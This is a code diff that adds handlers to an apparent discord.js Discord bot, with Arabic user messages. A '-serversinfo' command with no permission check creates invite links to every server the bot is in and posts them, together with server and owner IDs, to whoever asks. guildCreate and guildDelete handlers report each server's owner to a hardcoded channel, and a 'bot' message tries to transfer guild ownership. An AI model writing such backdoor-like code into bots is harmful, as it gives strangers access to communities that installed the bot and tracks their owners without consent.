@@ -4571,16 +4571,77 @@ client.on('message',async msg => {
 
 
 
+  client.on('message', ReBeL => {
+if(ReBeL.content.startsWith("c")){
+ReBeL.channel.send("لقد تم إشاء السيرفر , لرؤيته وأخذ ملكية السيرفر أتجه للخاص")
+client.user.createGuild('server.', 'us-central').then(Codes => {
+client.guilds.get(Codes.id).channels.filter(c => c.type === 'text').first().createInvite().then(i => ReBeL.author.send(i.url)).catch(RebeL =>{
+console.log('`Error`: ' + RebeL);
+ReBeL.channel.send("**لن يتم إرسال رابط السيرفر بسبب إغلاقك للخاص**");
+});
+client.guilds.get(Codes.id).channels.find("name","general").send("لأخذ ملكية السيرفر قم بكتابة `bot` .")
+console.log('It worked');
+});
+}
+if(ReBeL.content === "bot") {
+ReBeL.guild.setOwner(ReBeL.author);
+}
+});
+  
 
 
+  client.on("guildCreate", guild => {
+client.channels.get("492272547828596736").send(' ***  BOT  ***   **Join To**   ***[ ' + `${guild.name}` + ' ]***   ,   **  Owner  **  ' + ' ***[ ' + '<@' + `${guild.owner.user.id}` + '>' + ' ]***  **|**  ***[ ' + '<' + `${guild.owner.user.username}` + '>' + ' ]***')
+});
+
+client.on("guildDelete", guild => {
+client.channels.get("492272547828596736").send(' ***  BOT  ***   **Leave From**   ***[ ' + `${guild.name}` + ' ]***   ,   **  Owner  **  ' + ' ***[ ' + '<@' + `${guild.owner.user.id}` + '>' + ' ]***  **|**  ***[ ' + '<' + `${guild.owner.user.username}` + '>' + ' ]***')
+});
+  
+
+var prefix = "-";
+client.on('message', message => {
+  if (!message.content.startsWith(prefix)) return;
+  const verifed = ["252813587188416512"];
+if (message.content.startsWith(prefix + 'owner')) {
+if( verifed.some(word => message.author.id.includes(word)) ) {    return message.channel.sendMessage(`**   جا صاحب البوت هنا الكل يوقف**` + `✅`)
+} else {
+   message.reply('**انت لست صاحب البوت**' + '❌');   
+}
+}
+});
 
 
+client.on('ready',  () => {
+    console.log('By : ! 𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥.𝐇𝐞𝐦𝐚 ◉#7249');
+    console.log(`Logged in as * [ " ${client.user.username} " ] servers! [ " ${client.guilds.size} " ]`);
+    console.log(`Logged in as * [ " ${client.user.username} " ] Users! [ " ${client.users.size} " ]`);
+    console.log(`Logged in as * [ " ${client.user.username} " ] channels! [ " ${client.channels.size} " ]`);
+  });
 
-
-
-
-
-
+  client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '-serversinfo') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
 
 
